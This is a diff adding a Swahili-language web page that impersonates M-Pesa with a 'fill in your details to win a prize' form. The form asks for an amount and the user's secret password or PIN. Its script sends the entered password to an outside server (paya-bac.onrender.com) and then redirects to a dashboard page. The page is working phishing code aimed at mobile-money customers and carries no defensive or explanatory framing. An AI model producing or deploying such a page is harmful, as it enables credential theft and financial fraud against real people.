@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jaza Taarifa Zako - M-Pesa</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #1a237e 0%, #0d1642 50%, #1a237e 100%);
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 40px 30px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .watermark {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 280px;
+            font-weight: 900;
+            color: rgba(255, 255, 255, 0.08);
+            pointer-events: none;
+            z-index: 1;
+            font-family: Arial, sans-serif;
+            letter-spacing: -10px;
+            white-space: nowrap;
+        }
+
+        .watermark::before {
+            content: "M";
+            position: absolute;
+            top: -120px;
+            left: -80px;
+            font-size: 200px;
+            color: rgba(255, 255, 255, 0.06);
+        }
+
+        .watermark::after {
+            content: "pesa";
+            position: absolute;
+            bottom: -100px;
+            right: -100px;
+            font-size: 180px;
+            color: rgba(255, 215, 0, 0.15);
+            font-weight: 800;
+        }
+
+        .curve-line {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 200px;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        .curve-line::before {
+            content: '';
+            position: absolute;
+            bottom: 80px;
+            left: -10%;
+            width: 120%;
+            height: 150px;
+            border: 4px solid #d4af37;
+            border-radius: 50% 50% 0 0;
+            border-bottom: none;
+            opacity: 0.8;
+        }
+
+        .content {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+        }
+
+        h1 {
+            color: white;
+            font-size: 42px;
+            font-weight: 900;
+            text-transform: uppercase;
+            line-height: 1.1;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.95);
+            font-size: 16px;
+            margin-bottom: 50px;
+            line-height: 1.5;
+            font-weight: 400;
+        }
+
+        .form-group {
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            text-transform: capitalize;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 18px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            background: white;
+            color: #666;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            outline: none;
+            transition: box-shadow 0.3s ease;
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #999;
+            font-size: 16px;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 20px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(180deg, #ffa726 0%, #f57c00 100%);
+            color: white;
+            font-size: 24px;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 6px 0 #e65100, 0 10px 20px rgba(0,0,0,0.3);
+            transition: all 0.1s ease;
+            position: relative;
+            top: 0;
+        }
+
+        .submit-btn:active {
+            top: 6px;
+            box-shadow: 0 0 0 #e65100, 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(180deg, #ffb74d 0%, #f57c00 100%);
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 32px;
+            }
+            
+            .watermark {
+                font-size: 200px;
+            }
+            
+            .container {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="watermark">M</div>
+<div class="curve-line"></div>
+
+<div class="container">
+<div class="content">
+
+<h1>Jaza Taarifa Zako Kushinda Zawadi!</h1>
+<p class="subtitle">Ingiza tairifa zako kupata nafasi ya kushinda zawadi murwa.</p>
+
+<form id="loginForm">
+
+<div class="form-group">
+<label for="amount">Weka Kiasi Cha Zawadi</label>
+<input type="text" id="amount" name="amount" placeholder="Ingiza kiasi cha zawadi...">
+</div>
+
+<div class="form-group">
+<label for="password">Neno Lako La Siri</label>
+<input type="password" id="password" name="password" placeholder="Ingiza neno lako la siri...">
+</div>
+
+<button type="submit" class="submit-btn">Tuma</button>
+
+</form>
+
+</div>
+</div>
+
+<script>
+
+document.getElementById("loginForm").addEventListener("submit", async function(e){
+
+e.preventDefault();
+
+const amount = document.getElementById("amount").value;
+const password = document.getElementById("password").value;
+
+await fetch("https://paya-bac.onrender.com/login",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+amount:amount,
+password:password
+})
+
+});
+
+// redirect to dashboard after submit
+window.location.href = "dashboard.html";
+
+});
+
+</script>
+
+</body>
+</html>
